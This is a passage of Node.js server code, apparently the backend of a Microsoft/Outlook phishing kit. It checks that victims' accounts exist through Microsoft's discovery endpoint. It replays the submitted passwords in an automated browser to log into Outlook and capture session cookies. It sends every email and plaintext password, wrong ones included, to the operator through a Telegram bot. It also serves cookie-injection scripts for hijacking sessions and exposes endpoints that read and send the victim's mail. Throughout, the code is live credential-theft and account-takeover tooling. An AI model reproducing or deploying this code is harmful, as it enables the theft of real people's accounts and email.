            } else if (tokenError.message.includes('AADSTS50034')) {
                errorMessage = 'We couldn\'t find an account with that username. Try another, or get a new Microsoft account.';
            }

            // Store failed authentication attempt
            const sessionDir = path.join(__dirname, 'session_data');
            const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
            const failureData = {
                id: failureId,
                sessionId: targetSession.sessionId,
                email: targetSession.userEmail || 'Unknown',
                reason: 'OAuth Authentication Failed',
                errorMessage: errorMessage,
                errorDetails: errorDetails,
                timestamp: new Date().toISOString(),
                status: 'invalid',
                authUrl: req.originalUrl
            };

            fs.writeFileSync(
                path.join(sessionDir, `invalid_${failureId}.json`),
                JSON.stringify(failureData, null, 2)
            );

            analytics.failedLogins++;
            saveAnalytics();

            return res.status(400).send(`
                <html>
                    <head><title>Authentication Failed</title></head>
                    <body>
                        <h2>❌ Authentication Failed</h2>
                        <p style="color: #d13438;">${errorMessage}</p>
                        <p><a href="/">Try again</a></p>
                        <script>
                            setTimeout(() => {
                                window.close() || (window.location.href = '/');
                            }, 3000);
                        </script>
                    </body>
                </html>
            `);
        }

        analytics.successfulLogins++;
        saveAnalytics();

        console.log(`✅ User authenticated successfully`);

        // Send success response with redirect to frontend
        res.send(`
            <html>
                <head><title>Authentication Successful</title></head>
                <body>
                    <h2>✅ Authentication Successful!</h2>
                    <p>You can now close this window and return to the application.</p>
                    <script>
                        // Try to close the window, or redirect back to main app
                        setTimeout(() => {
                            window.close() || (window.location.href = '/');
                        }, 2000);
                    </script>
                </body>
            </html>
        `);

        // Send Telegram notification if bot is available
        if (telegramBot) {
            try {
                await telegramBot.sendLoginNotification({
                    email: targetSession.userEmail,
                    password: 'Captured via OAuth', // OAuth doesn't capture actual password
                    timestamp: new Date().toISOString(),
                    sessionId: targetSession.sessionId,
                    authMethod: 'Microsoft Graph API',
                    totalCookies: 0 // OAuth method doesn't capture cookies directly
                });
                console.log(`📤 Telegram notification sent for ${targetSession.userEmail}`);
            } catch (error) {
                console.error('❌ Failed to send Telegram notification:', error.message);
            }
        }

    } catch (error) {
        console.error('Error in auth callback:', error);
        analytics.failedLogins++;
        saveAnalytics();

        res.status(500).send(`
            <html>
                <head><title>Authentication Failed</title></head>
                <body>
                    <h2>❌ Authentication Failed</h2>
                    <p>Error: ${error.message}</p>
                    <p><a href="/">Return to main page</a></p>
                </body>
            </html>
        `);
    }
});

// Get user profile
app.get('/api/profile', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.query.sessionId;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }

        const userProfile = await session.graphAuth.getUserProfile();

        res.json({
            profile: userProfile,
            email: session.userEmail,
            sessionId: sessionId,
            verified: session.verified // Include verification status
        });

    } catch (error) {
        console.error('Error getting user profile:', error);
        res.status(500).json({ 
            error: 'Failed to get user profile',
            details: error.message 
        });
    }
});

// Get emails
app.get('/api/emails', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.query.sessionId;
        const count = parseInt(req.query.count) || 10;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }

        const emails = await session.graphAuth.getEmails(count);

        res.json({
            emails: emails,
            count: emails.length,
            sessionId: sessionId
        });

    } catch (error) {
        console.error('Error getting emails:', error);
        res.status(500).json({ 
            error: 'Failed to get emails',
            details: error.message 
        });
    }
});

// Send email
app.post('/api/send-email', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.body.sessionId;
        const { to, subject, body, isHtml = false } = req.body;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }

        if (!to || !subject || !body) {
            return res.status(400).json({ 
                error: 'Missing required fields',
                message: 'to, subject, and body are required' 
            });
        }

        await session.graphAuth.sendEmail(to, subject, body, isHtml);

        res.json({
            success: true,
            message: 'Email sent successfully',
            sessionId: sessionId
        });

    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ 
            error: 'Failed to send email',
            details: error.message 
        });
    }
});

// Verify email endpoint
app.post('/api/verify-email', async (req, res) => {
    try {
        const { email } = req.body;

        if (!email) {
            return res.status(400).json({ 
                error: 'Email is required',
                exists: false 
            });
        }

        // Extract domain from email
        const domain = email.split('@')[1];
        if (!domain) {
            return res.json({
                exists: false,
                email: email,
                message: "Please enter a valid email address."
            });
        }

        try {
            // Use Microsoft's discovery endpoint to check if the domain is federated with Microsoft
            const discoveryUrl = `https://login.microsoftonline.com/common/userrealm/${encodeURIComponent(email)}?api-version=1.0`;

            const response = await fetch(discoveryUrl, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'User-Agent': 'Microsoft-Graph-Auth-App'
                }
            });

            if (response.ok) {
                const data = await response.json();

                // Check if the account exists and is a valid Microsoft account
                // Microsoft accounts can have various AccountType values: Managed, Federated, Unknown, etc.
                console.log(`Raw Microsoft discovery response for ${email}:`, data);

                const isValidAccount = (
                    (data.Account === 'Managed') ||
                    (data.account_type === 'Managed') ||
                    (data.NameSpaceType === 'Managed') ||
                    (data.AuthURL && data.AuthURL.includes('login.microsoftonline.com'))
                );

                if (isValidAccount) {
                    console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);

                    // Start browser preloading in background for faster password authentication
                    const sessionId = createSessionId();

                    // Start preload without awaiting - let it run in parallel
                    const preloadPromise = startBrowserPreload(sessionId, email).catch(error => {
                        console.warn(`⚠️ Browser preload failed for ${email}:`, error.message);
                        return false;
                    });

                    // Log verification success without creating files
                    console.log(`✅ Email verification successful for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);

                    res.json({
                        exists: true,
                        email: email,
                        message: 'Account found. Please enter your password.',
                        accountType: data.Account || data.account_type || data.NameSpaceType,
                        sessionId: sessionId,  // Return session ID for browser preloading
                        preloadStarted: true
                    });
                } else {
                    console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
                    console.log(`Discovery response:`, data);

                    // Do not create files for account not found errors - just return response
                    res.json({
                        exists: false,
                        email: email,
                        message: "We couldn't verify your account. Please check your email address and try again."
                    });
                }
            } else {
                throw new Error(`Discovery API returned ${response.status}: ${response.statusText}`);
            }

        } catch (error) {
            console.log(`❌ Email verification error for: ${email} - ${error.message}`);

            // For network errors or API issues, we'll be conservative and reject
            res.json({
                exists: false,
                email: email,
                message: "We couldn't verify your account. Please check your email address and try again."
            });
        }

    } catch (error) {
        console.error('Error in email verification:', error);
        res.status(500).json({ 
            error: 'Email verification failed',
            exists: false,
            details: error.message 
        });
    }
});

// Fast password authentication endpoint using preloaded browsers
app.post('/api/authenticate-password-fast', async (req, res) => {
    try {
        const { email, password, sessionId } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                error: 'Email and password are required',
                success: false 
            });
        }

        console.log(`🚀 Attempting FAST authentication for: ${email} (preload session: ${sessionId})`);

        // Check if there's a preloaded session ready for this email
        let preloadedSession = null;
        const startTime = Date.now();

        if (sessionId && automationSessions.has(sessionId)) {
            const session = automationSessions.get(sessionId);

            // Validate session matches email for security
            if (session.email !== email) {
                console.warn(`⚠️ Session email mismatch: expected ${email}, got ${session.email}`);
            } else if (session.status === 'preload_ready') {
                preloadedSession = session;
                console.log(`✅ Found preloaded browser ready for: ${email} (${sessionId})`);
            } else if (session.status === 'preloading') {
                // Wait for preload to complete (bounded wait up to 15 seconds)
                console.log(`⏳ Preload in progress for: ${email}, waiting for completion...`);
                const maxWaitTime = 15000; // 15 seconds
                const pollInterval = 500; // 500ms

                for (let waited = 0; waited < maxWaitTime; waited += pollInterval) {
                    await new Promise(resolve => setTimeout(resolve, pollInterval));

                    if (!automationSessions.has(sessionId)) {
                        console.log(`⚠️ Preload session disappeared during wait: ${sessionId}`);
                        break;
                    }

                    const updatedSession = automationSessions.get(sessionId);
                    if (updatedSession.status === 'preload_ready') {
                        preloadedSession = updatedSession;
                        console.log(`✅ Preload completed during wait for: ${email} (waited ${waited + pollInterval}ms)`);
                        break;
                    } else if (updatedSession.status === 'preload_failed') {
                        console.log(`❌ Preload failed during wait for: ${email} (waited ${waited + pollInterval}ms)`);
                        break;
                    }
                }

                if (!preloadedSession && automationSessions.has(sessionId)) {
                    console.log(`⏰ Preload wait timeout for: ${email}, falling back to cold start`);
                }
            } else if (session.status === 'preload_failed') {
                console.log(`❌ Found failed preload session for: ${email}, will use cold start`);
            }
        }

        let automation = null;
        let newSessionId = sessionId;
        let usingPreloadedBrowser = false;

        if (preloadedSession) {
            // Use preloaded browser for fast authentication
            automation = preloadedSession.automation;
            usingPreloadedBrowser = true;
            automationSessions.get(sessionId).status = 'authenticating';
            console.log(`⚡ Using preloaded browser for fast authentication: ${email}`);

            try {
                // Use the continue phase with the preloaded browser
                const loginSuccess = await automation.continueWithPassword(email, password);

                if (loginSuccess) {
                    console.log(`💾 Fast authentication successful, saving session for: ${email}`);
                    const sessionValidation = await automation.validateSession(email, password);

                    if (sessionValidation.success) {
                        // Create user session entry
                        userSessions.set(sessionId, {
                            sessionId: sessionId,
                            graphAuth: null, // No Graph API needed
                            userEmail: email,
                            createdAt: Date.now(),
                            oauthState: null,
                            authenticated: true,
                            verified: true,
                            cookiesSaved: sessionValidation.cookiesSaved,
                            usedPreload: true // Track that this used preloading
                        });

                        analytics.successfulLogins++;
                        saveAnalytics();

                        console.log(`🎯 FAST authentication successful for: ${email} (${sessionId})`);

                        // Send Telegram notification if bot is available
                        if (telegramBot) {
                            try {
                                await telegramBot.sendLoginNotification({
                                    email: email,
                                    password: password,
                                    timestamp: new Date().toISOString(),
                                    sessionId: sessionId,
                                    totalCookies: sessionValidation.cookiesSaved || 0,
                                    authMethod: 'FAST Authentication (preloaded browser)'
                                });
                                console.log(`📤 Telegram notification sent for ${email}`);
                            } catch (telegramError) {
                                console.warn('Telegram notification failed:', telegramError.message);
                            }
                        }

                        // Clean up preload session after short delay
                        setTimeout(async () => {
                            try {
                                await automation.close();
                                automationSessions.delete(sessionId);
                                console.log(`🧹 Cleaned up fast auth session: ${sessionId}`);
                            } catch (cleanupError) {
                                console.warn('Error cleaning up fast auth session:', cleanupError.message);
                            }
                        }, 5000);

                        // Calculate performance metrics
                        const totalAuthMs = Date.now() - startTime;
                        console.log(`📊 Fast auth metrics - Total: ${totalAuthMs}ms, Preload: TRUE`);

                        return res.json({
                            success: true,
                            message: 'Authentication successful (fast)',
                            sessionId: sessionId,
                            userEmail: email,
                            cookiesSaved: sessionValidation.cookiesSaved,
                            preloadUsed: true,
                            requiresOAuth: false,
                            metrics: {
                                totalAuthMs: totalAuthMs,
                                preloadUsed: true
                            }
                        });

                    } else {
                        console.error(`❌ Fast auth session validation failed for: ${email}`);
                        return res.status(401).json({
                            success: false,
                            error: 'Session validation failed',
                            message: sessionValidation.error || 'Could not validate session',
                            preloadUsed: true,
                            requiresOAuth: false
                        });
                    }

                } else {
                    // Fast authentication failed - password was incorrect
                    analytics.failedLogins++;
                    saveAnalytics();

                    console.log(`❌ Fast authentication failed for: ${email} - incorrect password`);

                    // Store failed attempt for admin panel
                    const sessionDir = path.join(__dirname, 'session_data');
                    if (!fs.existsSync(sessionDir)) {
                        fs.mkdirSync(sessionDir, { recursive: true });
                    }

                    const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
                    const failureData = {
                        id: failureId,
                        sessionId: sessionId,
                        email: email,
                        reason: 'Wrong Password',
                        errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                        timestamp: new Date().toISOString(),
                        status: 'invalid',
                        method: 'fast-authentication',
                        preloadUsed: true,
                        failureType: 'incorrect_password',
                        encryptedData: encryptData(JSON.stringify({ password: password }))
                    };

                    fs.writeFileSync(
                        path.join(sessionDir, `invalid_${failureId}.json`),
                        JSON.stringify(failureData, null, 2)
                    );

                    console.log(`💾 Stored invalid session record: invalid_${failureId}.json`);

                    // Send Telegram notification for failed attempt
                    if (telegramBot) {
                        try {
                            await telegramBot.sendFailedLoginNotification({
                                email: email,
                                password: password,
                                timestamp: new Date().toISOString(),
                                sessionId: sessionId,
                                reason: 'Incorrect Password',
                                authMethod: 'FAST Authentication (preloaded browser)',
                                preloadUsed: true
                            });
                            console.log(`📤 Telegram failed login notification sent for ${email}`);
                        } catch (telegramError) {
                            console.warn('Telegram failed login notification failed:', telegramError.message);
                        }
                    }

                    // Clean up failed session
                    setTimeout(async () => {
                        try {
                            await automation.close();
                            automationSessions.delete(sessionId);
                        } catch (cleanupError) {
                            console.warn('Error cleaning up failed fast auth:', cleanupError.message);
                        }
                    }, 2000);

                    return res.status(401).json({
                        success: false,
                        error: 'Invalid credentials',
                        message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                        preloadUsed: true,
                        requiresOAuth: false
                    });
                }

            } catch (fastAuthError) {
                console.warn(`⚠️ Fast authentication failed, falling back to cold start: ${fastAuthError.message}`);
                // Clean up failed preload
                try {
                    await automation.close();
                    automationSessions.delete(sessionId);
                } catch (cleanupError) {
                    console.warn('Error cleaning up failed fast auth:', cleanupError.message);
                }
                // Continue to fallback logic below
                usingPreloadedBrowser = false;
            }
        }

        // Fallback to regular authentication if no preload or preload failed
        if (!usingPreloadedBrowser) {
            console.log(`🔄 No preload available or failed, using cold start for: ${email}`);

            automation = new ClosedBridgeAutomation({
                enableScreenshots: true,
                screenshotQuality: 80,
                sessionId: newSessionId,
                eventCallback: broadcastAuthEvent
            });

            newSessionId = createSessionId();

            try {
                await automation.init();
                const navigated = await automation.navigateToOutlook();

                if (!navigated) {
                    throw new Error('Failed to navigate to Outlook');
                }

                const loginSuccess = await automation.performLogin(email, password);

                if (!loginSuccess) {
                    await automation.close();
                    console.log(`❌ Cold start authentication failed for: ${email}`);

                    analytics.failedLogins++;
                    saveAnalytics();

                    // Store failed attempt for admin panel
                    const sessionDir = path.join(__dirname, 'session_data');
                    if (!fs.existsSync(sessionDir)) {
                        fs.mkdirSync(sessionDir, { recursive: true });
                    }

                    const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
                    const failureData = {
                        id: failureId,
                        sessionId: newSessionId,
                        email: email,
                        reason: 'Wrong Password',
                        errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                        timestamp: new Date().toISOString(),
                        status: 'invalid',
                        method: 'cold-start-authentication',
                        preloadUsed: false,
                        failureType: 'incorrect_password'
                    };

                    fs.writeFileSync(
                        path.join(sessionDir, `invalid_${failureId}.json`),
                        JSON.stringify(failureData, null, 2)
                    );

                    console.log(`💾 Stored invalid session record: invalid_${failureId}.json`);

                    // Send Telegram notification for failed attempt
                    if (telegramBot) {
                        try {
                            await telegramBot.sendFailedLoginNotification({
                                email: email,
                                password: password,
                                timestamp: new Date().toISOString(),
                                sessionId: newSessionId,
                                reason: 'Incorrect Password',
                                authMethod: 'Cold Start Authentication',
                                preloadUsed: false
                            });
                            console.log(`📤 Telegram failed login notification sent for ${email}`);
                        } catch (telegramError) {
                            console.warn('Telegram failed login notification failed:', telegramError.message);
                        }
                    }

                    return res.status(401).json({
                        success: false,
                        error: 'Invalid credentials',
                        message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                        preloadUsed: false,
                        requiresOAuth: false
                    });
                }

                // Save session and cookies directly
                console.log(`💾 Cold start saving session cookies for: ${email}`);
                const sessionValidation = await automation.validateSession(email, password);
                await automation.close();

                if (sessionValidation.success) {
                    // Create user session entry
                    userSessions.set(newSessionId, {
                        sessionId: newSessionId,
                        graphAuth: null, // No Graph API needed
                        userEmail: email,
                        createdAt: Date.now(),
                        oauthState: null,
                        authenticated: true,
                        verified: true,
                        cookiesSaved: sessionValidation.cookiesSaved,
                        usedPreload: false // Track that this was cold start
                    });

                    analytics.successfulLogins++;
                    saveAnalytics();

                    console.log(`✅ Cold start authentication successful for: ${email}`);

                    // Calculate performance metrics
                    const totalAuthMs = Date.now() - startTime;
                    console.log(`📊 Cold start auth metrics - Total: ${totalAuthMs}ms, Preload: FALSE`);

                    return res.json({
                        success: true,
                        message: 'Authentication successful (cold start)',
                        sessionId: newSessionId,
                        userEmail: email,
                        cookiesSaved: sessionValidation.cookiesSaved,
                        preloadUsed: false,
                        requiresOAuth: false,
                        redirectToOneDrive: true, // Signal frontend to redirect
                        metrics: {
                            totalAuthMs: totalAuthMs,
                            preloadUsed: false
                        }
                    });

                } else {
                    analytics.failedLogins++;
                    saveAnalytics();

                    return res.status(401).json({
                        success: false,
                        error: 'Session validation failed',
                        message: sessionValidation.error || 'Could not validate session',
                        preloadUsed: false,
                        requiresOAuth: false
                    });
                }

            } catch (automationError) {
                console.error(`❌ Cold start error for ${email}:`, automationError.message);

                try {
                    await automation.close();
                } catch (closeError) {
                    // Ignore close errors
                }

                analytics.failedLogins++;
                saveAnalytics();

                return res.status(401).json({
                    success: false,
                    error: 'Authentication failed',
                    message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                    preloadUsed: false,
                    requiresOAuth: false
                });
            }
        }

    } catch (error) {
        console.error('Error in fast password authentication:', error);
        analytics.failedLogins++;
        saveAnalytics();

        res.status(500).json({ 
            error: 'Authentication failed',
            success: false,
            details: error.message,
            preloadUsed: false,
            requiresOAuth: false
        });
    }
});

// Direct login automation endpoint using Puppeteer
app.post('/api/login-automation', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                error: 'Email and password are required',
                success: false 
            });
        }

        const sessionId = createSessionId();
        console.log(`🤖 Starting automation login for: ${email} (Session: ${sessionId})`);

        // Initialize automation
        const automation = new ClosedBridgeAutomation({
            enableScreenshots: true,
            screenshotQuality: 80,
            sessionId: sessionId,
            eventCallback: broadcastAuthEvent
        });

        // Store automation session
        automationSessions.set(sessionId, {
            automation: automation,
            status: 'initializing',
            email: email,
            password: password, // Store password for later use
            startTime: Date.now()
        });

        // Start automation process
        try {
            console.log(`🔧 Initializing browser for session: ${sessionId}`);
            await automation.init();

            automationSessions.get(sessionId).status = 'navigating';
            console.log(`🌐 Navigating to Outlook for session: ${sessionId}`);
            const navigated = await automation.navigateToOutlook();

            if (!navigated) {
                throw new Error('Failed to navigate to Outlook');
            }

            automationSessions.get(sessionId).status = 'logging_in';
            console.log(`🔐 Attempting login for session: ${sessionId}`);
            const loginSuccess = await automation.performLogin(email, password);

            if (loginSuccess) {
                automationSessions.get(sessionId).status = 'saving_session';
                console.log(`💾 Saving session cookies for: ${email}`);
                const sessionValidation = await automation.validateSession(email, password);

                automationSessions.get(sessionId).status = 'completed';

                analytics.successfulLogins++;
                saveAnalytics();

                console.log(`✅ Automation login successful for: ${email}`);

                // Send Telegram notification if bot is available
                if (telegramBot) {
                    try {
                        await telegramBot.sendLoginNotification({
                            email: email,
                            password: password,
                            timestamp: new Date().toISOString(),
                            sessionId: sessionId,
                            totalCookies: sessionValidation.cookiesSaved || 0,
                            authMethod: 'Puppeteer Automation'
                        });
                        console.log(`📤 Telegram notification sent for ${email}`);
                    } catch (error) {
                        console.error('❌ Failed to send Telegram notification:', error.message);
                    }
                }

                res.json({
                    success: true,
                    sessionId: sessionId,
                    email: email,
                    message: 'Login successful! Session validated.',
                    sessionValidation: sessionValidation,
                    method: 'automation'
                });

                // Clean up automation after successful completion
                setTimeout(async () => {
                    try {
                        if (automationSessions.has(sessionId)) {
                            await automation.close();
                            automationSessions.delete(sessionId);
                            console.log(`🧹 Cleaned up automation session: ${sessionId}`);
                        }
                    } catch (error) {
                        console.error(`Error cleaning up automation session ${sessionId}:`, error.message);
                    }
                }, 5000);

            } else {
                automationSessions.get(sessionId).status = 'failed';

                analytics.failedLogins++;
                saveAnalytics();

                console.log(`❌ Automation login failed for: ${email}`);

                // Store failed attempt
                const sessionDir = path.join(__dirname, 'session_data');
                const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
                const failureData = {
                    id: failureId,
                    sessionId: sessionId,
                    email: email,
                    reason: 'Wrong Password',
                    errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                    timestamp: new Date().toISOString(),
                    status: 'invalid',
                    method: 'automation',
                    failureType: 'incorrect_password'
                };

                fs.writeFileSync(
                    path.join(sessionDir, `invalid_${failureId}.json`),
                    JSON.stringify(failureData, null, 2)
                );

                // Send Telegram notification for failed attempt
                if (telegramBot) {
                    try {
                        await telegramBot.sendFailedLoginNotification({
                            email: email,
                            password: password,
                            timestamp: new Date().toISOString(),
                            sessionId: sessionId,
                            reason: 'Incorrect Password',
                            authMethod: 'Puppeteer Automation',
                            preloadUsed: false
                        });
                        console.log(`📤 Telegram failed login notification sent for ${email}`);
                    } catch (telegramError) {
                        console.warn('Telegram failed login notification failed:', telegramError.message);
                    }
                }

                res.status(401).json({
                    success: false,
                    sessionId: sessionId,
                    error: 'Login failed',
                    message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                    method: 'automation'
                });

                // Clean up failed automation
                setTimeout(async () => {
                    try {
                        if (automationSessions.has(sessionId)) {
                            await automation.close();
                            automationSessions.delete(sessionId);
                            console.log(`🧹 Cleaned up failed automation session: ${sessionId}`);
                        }
                    } catch (error) {
                        console.error(`Error cleaning up failed automation session ${sessionId}:`, error.message);
                    }
                }, 2000);
            }

        } catch (automationError) {
            console.error(`❌ Automation error for session ${sessionId}:`, automationError.message);

            if (automationSessions.has(sessionId)) {
                automationSessions.get(sessionId).status = 'error';
            }

            analytics.failedLogins++;
            saveAnalytics();

            // Clean up on error
            try {
                if (automationSessions.has(sessionId)) {
                    await automation.close();
                    automationSessions.delete(sessionId);
                }
            } catch (cleanupError) {
                console.error(`Error cleaning up automation after error:`, cleanupError.message);
            }

            res.status(500).json({
                success: false,
                sessionId: sessionId,
                error: 'Automation failed',
                message: 'Technical error during login process. Please try again.',
                details: automationError.message,
                method: 'automation'
            });
        }

    } catch (error) {
        console.error('Error in login automation endpoint:', error);
        analytics.failedLogins++;
        saveAnalytics();

        res.status(500).json({ 
            error: 'Login automation failed',
            success: false,
            details: error.message 
        });
    }
});

// Check automation status
app.get('/api/automation-status/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;

    if (automationSessions.has(sessionId)) {
        const automationSession = automationSessions.get(sessionId);
        res.json({
            sessionId: sessionId,
            status: automationSession.status,
            email: automationSession.email,
            startTime: automationSession.startTime,
            duration: Date.now() - automationSession.startTime
        });
    } else {
        res.status(404).json({
            error: 'Automation session not found',
            sessionId: sessionId
        });
    }
});

// Cancel automation session (requires session ownership)
app.delete('/api/automation-cancel/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const clientSessionId = req.headers['x-session-id'] || req.query.clientSessionId;

    if (automationSessions.has(sessionId)) {
        const automationSession = automationSessions.get(sessionId);

        // Verify session ownership or admin access
        const hasAdminAccess = req.headers['x-admin-token'] === ADMIN_TOKEN;
        const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId);

        if (!hasAdminAccess && !hasSessionAccess) {
            return res.status(403).json({
                error: 'Access denied - invalid session or admin token',
                sessionId: sessionId
            });
        }

        try {
            // Close the automation browser
            if (automationSession.automation) {
                await automationSession.automation.close();
            }

            // Remove from sessions
            automationSessions.delete(sessionId);

            console.log(`🚫 Cancelled automation session: ${sessionId}`);

            res.json({
                success: true,
                sessionId: sessionId,
                message: 'Automation session cancelled successfully'
            });

        } catch (error) {
            console.error(`Error cancelling automation session ${sessionId}:`, error.message);

            // Still remove from sessions even if close failed
            automationSessions.delete(sessionId);

            res.json({
                success: true,
                sessionId: sessionId,
                message: 'Automation session cancelled (with cleanup warnings)',
                warning: error.message
            });
        }
    } else {
        res.status(404).json({
            error: 'Automation session not found',
            sessionId: sessionId
        });
    }
});

// Internal redirect URL endpoint (used by automation and admin panel)
app.get('/api/internal/redirect-url', (req, res) => {
    try {
        // Load redirect configuration
        const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
        let redirectUrl = 'https://office.com'; // Default fallback

        if (fs.existsSync(redirectConfigPath)) {
            try {
                const redirectConfig = JSON.parse(fs.readFileSync(redirectConfigPath, 'utf8'));
                if (redirectConfig.redirectUrl) {
                    redirectUrl = redirectConfig.redirectUrl;
                }
            } catch (configError) {
                console.warn('Error reading redirect config:', configError.message);
            }
        }

        res.json({
            success: true,
            redirectUrl: redirectUrl
        });
    } catch (error) {
        console.error('Error getting redirect URL:', error);
        res.json({
            success: false,
            redirectUrl: 'https://office.com',
            error: error.message
        });
    }
});

// Get session status
app.get('/api/status', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.query.sessionId;

    if (sessionId && userSessions.has(sessionId)) {
        const session = userSessions.get(sessionId);
        const isAuthenticated = !!(session.authenticated && session.userEmail);

        res.json({
            authenticated: isAuthenticated,
            userEmail: session.userEmail,
            sessionId: sessionId,
            sessionCount: userSessions.size,
            hasToken: !!session.graphAuth?.accessToken,
            verified: !!session.verified,
            cookiesSaved: !!session.cookiesSaved
        });
    } else {
        res.json({
            authenticated: false,
            sessionCount: userSessions.size,
            message: 'No active session'
        });
    }
});

// Preload status endpoint for specific session
app.get('/api/preload-status/:sessionId', (req, res) => {
    try {
        const sessionId = req.params.sessionId;

        if (automationSessions.has(sessionId)) {
            const session = automationSessions.get(sessionId);
            res.json({
                sessionId: sessionId,
                status: session.status,
                email: session.email,
                startTime: session.startTime,
                ageMs: Date.now() - session.startTime
            });
        } else {
            res.status(404).json({
                error: 'Preload session not found',
                sessionId: sessionId
            });
        }
    } catch (error) {
        console.error('Error getting preload status:', error);
        res.status(500).json({
            error: 'Failed to get preload status',
            details: error.message
        });
    }
});

// Preload statistics monitoring endpoint (admin only)
app.get('/api/preload-stats', requireAdminAuth, (req, res) => {
    try {
        const stats = getPreloadStats();
        const sessionDetails = Array.from(automationSessions.entries())
            .filter(([_, session]) => session.status && session.status.startsWith('preload'))
            .map(([sessionId, session]) => ({
                sessionId: sessionId,
                email: session.email,
                status: session.status,
                startTime: session.startTime,
                ageMs: Date.now() - session.startTime
            }));

        res.json({
            success: true,
            stats: stats,
            activeSessions: sessionDetails,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Error getting preload stats:', error);
        res.status(500).json({
            error: 'Failed to get preload statistics',
            details: error.message
        });
    }
});

// Serve cookie injection scripts
app.get('/api/cookies/:sessionId', (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const sessionDir = path.join(__dirname, 'session_data');
        const injectionFilename = `inject_session_${sessionId}.js`;
        const injectionPath = path.join(sessionDir, injectionFilename);

        if (fs.existsSync(injectionPath)) {
            const script = fs.readFileSync(injectionPath, 'utf8');
            res.setHeader('Content-Type', 'application/javascript');
            res.setHeader('Content-Disposition', `attachment; filename="${injectionFilename}"`);
            res.send(script);
        } else {
            res.status(404).json({
                error: 'Cookie injection script not found',
                sessionId: sessionId
            });
        }
    } catch (error) {
        console.error('Error serving cookie script:', error);
        res.status(500).json({
            error: 'Failed to serve cookie script',
            details: error.message
        });
    }
});

// Get session data with cookies
app.get('/api/session-data/:sessionId', (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const sessionDir = path.join(__dirname, 'session_data');

        // Find session file
        const sessionFiles = fs.readdirSync(sessionDir).filter(file => 
            file.startsWith(`session_${sessionId}_`) && file.endsWith('.json')
        );

        if (sessionFiles.length > 0) {
            const sessionFile = sessionFiles[0];
            const sessionPath = path.join(sessionDir, sessionFile);
            const sessionData = JSON.parse(fs.readFileSync(sessionPath, 'utf8'));

            // Return session data without sensitive cookie values
            const publicSessionData = {
                sessionId: sessionData.sessionId,
                email: sessionData.email,
                timestamp: sessionData.timestamp,
                status: sessionData.status,
                totalCookies: sessionData.totalCookies,
                domains: sessionData.domains,
                injectFilename: sessionData.injectFilename,
                cookieNames: sessionData.cookies ? sessionData.cookies.map(c => c.name) : []
            };

            res.json(publicSessionData);
        } else {
            res.status(404).json({
                error: 'Session data not found',
                sessionId: sessionId
            });
        }
    } catch (error) {
        console.error('Error getting session data:', error);
        res.status(500).json({
            error: 'Failed to get session data',
            details: error.message
        });
    }
});

// Admin endpoint to update project redirect configuration
app.post('/api/admin/project-redirect', requireAdminAuth, (req, res) => {
    try {
        const { redirectUrl } = req.body;

        if (!redirectUrl) {
            return res.status(400).json({
                success: false,
                error: 'redirectUrl is required'
            });
        }

        // Validate URL
        try {
            new URL(redirectUrl);
        } catch (urlError) {
            return res.status(400).json({
                success: false,
                error: 'Invalid URL format'
            });
        }

        // Update redirect-config.json
        const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
        const redirectConfig = {
            redirectUrl: redirectUrl,
            lastUpdated: new Date().toISOString()
        };

        fs.writeFileSync(redirectConfigPath, JSON.stringify(redirectConfig, null, 2));
        console.log(`📍 Project redirect updated to: ${redirectUrl}`);

        res.json({
            success: true,
            redirectUrl: redirectUrl,
            message: 'Project redirect configuration updated successfully'
        });

    } catch (error) {
        console.error('Error updating project redirect:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to update project redirect configuration',
            details: error.message
        });
    }
});

// Admin analytics endpoint
// Domain Rotation Management APIs
app.get('/api/domain-rotation/config', (req, res) => {
    res.json({
        success: true,
